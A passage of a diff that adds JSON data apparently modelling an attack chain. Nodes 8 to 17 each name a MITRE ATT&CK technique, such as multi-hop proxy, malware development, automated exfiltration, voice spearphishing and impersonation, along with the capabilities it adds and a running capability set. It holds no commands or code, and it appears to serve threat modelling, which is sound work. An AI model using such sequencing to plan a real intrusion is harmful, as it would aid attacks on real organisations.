+          "proxy_use",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "exfiltrated_data",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 8,
+        "technique": "T1585.002 - Email Accounts",
+        "adds": [
+          "resources",
+          "infrastructure"
+        ],
+        "cumulative_capabilities": [
+          "proxy_use",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "exfiltrated_data",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 9,
+        "technique": "T1083 - File and Directory Discovery",
+        "adds": [
+          "user_info",
+          "discovered_info",
+          "network_info",
+          "system_info"
+        ],
+        "cumulative_capabilities": [
+          "proxy_use",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "system_info",
+          "network_info",
+          "exfiltrated_data",
+          "discovered_info",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "user_info",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 10,
+        "technique": "T1090.003 - Multi-hop Proxy",
+        "adds": [
+          "c2_channel"
+        ],
+        "cumulative_capabilities": [
+          "proxy_use",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "system_info",
+          "network_info",
+          "exfiltrated_data",
+          "discovered_info",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "user_info",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 11,
+        "technique": "T1585 - Establish Accounts",
+        "adds": [
+          "resources",
+          "infrastructure"
+        ],
+        "cumulative_capabilities": [
+          "proxy_use",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "system_info",
+          "network_info",
+          "exfiltrated_data",
+          "discovered_info",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "user_info",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 12,
+        "technique": "T1587.001 - Malware",
+        "adds": [
+          "resources",
+          "infrastructure"
+        ],
+        "cumulative_capabilities": [
+          "proxy_use",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "system_info",
+          "network_info",
+          "exfiltrated_data",
+          "discovered_info",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "user_info",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 13,
+        "technique": "T1588.002 - Tool",
+        "adds": [
+          "resources",
+          "infrastructure"
+        ],
+        "cumulative_capabilities": [
+          "proxy_use",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "system_info",
+          "network_info",
+          "exfiltrated_data",
+          "discovered_info",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "user_info",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 14,
+        "technique": "T1020 - Automated Exfiltration",
+        "adds": [
+          "exfiltrated_data"
+        ],
+        "cumulative_capabilities": [
+          "proxy_use",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "system_info",
+          "network_info",
+          "exfiltrated_data",
+          "discovered_info",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "user_info",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 15,
+        "technique": "T1586.002 - Email Accounts",
+        "adds": [
+          "resources",
+          "infrastructure"
+        ],
+        "cumulative_capabilities": [
+          "proxy_use",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "system_info",
+          "network_info",
+          "exfiltrated_data",
+          "discovered_info",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "user_info",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 16,
+        "technique": "T1598.004 - Spearphishing Voice",
+        "adds": [
+          "target_intel"
+        ],
+        "cumulative_capabilities": [
+          "proxy_use",
+          "target_intel",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "system_info",
+          "network_info",
+          "exfiltrated_data",
+          "discovered_info",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "user_info",
+          "code_execution"
+        ]
+      },
+      {
+        "node_index": 17,
+        "technique": "T1656 - Impersonation",
+        "adds": [
+          "evasion_capability"
+        ],
+        "cumulative_capabilities": [
+          "proxy_use",
+          "target_intel",
+          "evasion_capability",
+          "resources",
+          "infrastructure",
+          "system_info",
+          "network_info",
+          "exfiltrated_data",
+          "discovered_info",
+          "persistent_access",
+          "execution_capability",
+          "c2_channel",
+          "collected_data",
+          "user_info",
+          "code_execution"
+        ]
+      }
+    ]
+  }
+}
